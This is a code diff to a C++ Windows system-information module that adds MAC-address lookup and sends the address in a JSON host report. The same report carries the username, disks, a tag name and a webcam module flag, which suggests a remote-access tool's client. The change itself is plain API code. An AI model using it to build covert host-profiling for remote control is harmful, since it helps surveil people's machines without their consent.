@@ -1,6 +1,7 @@
 #include "SystemInformation.h"
 #include "json.hpp"
-
+#include <iphlpapi.h>
+#include <iomanip>
 
 std::string SystemInformation::getWindowsVersion() {
     OSVERSIONINFOEX info;
@@ -40,6 +41,30 @@ std::string SystemInformation::getWindowsVersion() {
     return str;
 }
 
+std::string SystemInformation::getPrimaryMACAddress() {
+    IP_ADAPTER_INFO adapterInfo[16];
+    DWORD dwBufLen = sizeof(adapterInfo);
+    DWORD dwStatus = GetAdaptersInfo(adapterInfo, &dwBufLen);
+
+    if (dwStatus != ERROR_SUCCESS) {
+        return "Error obtaining adapter info.";
+    }
+
+    PIP_ADAPTER_INFO pAdapterInfo = adapterInfo;
+    while (pAdapterInfo) {
+        if (pAdapterInfo->Type == MIB_IF_TYPE_ETHERNET && pAdapterInfo->AddressLength == 6) {
+            std::ostringstream mac;
+            for (UINT i = 0; i < pAdapterInfo->AddressLength; i++) {
+                if (i != 0) mac << '-';
+                mac << std::hex << std::setw(2) << std::setfill('0') << (int)pAdapterInfo->Address[i];
+            }
+            return mac.str();
+        }
+        pAdapterInfo = pAdapterInfo->Next;
+    }
+
+    return "No MAC address found.";
+}
 
 std::string SystemInformation::getUsername() {
     char username[UNLEN + 1];
@@ -60,7 +85,7 @@ nlohmann::json SystemInformation::getSystemInformation() {
     json["username"] = getUsername();
     json["disks"] = FileManager::getDisks();
     json["tag_name"] = TAG_NAME;
-    json["mutex"] = MUTEX;
+    json["mutex"] = getPrimaryMACAddress();
     // Add or not modules to server
 #ifdef WEBCAM
     json["webcam"] = true;
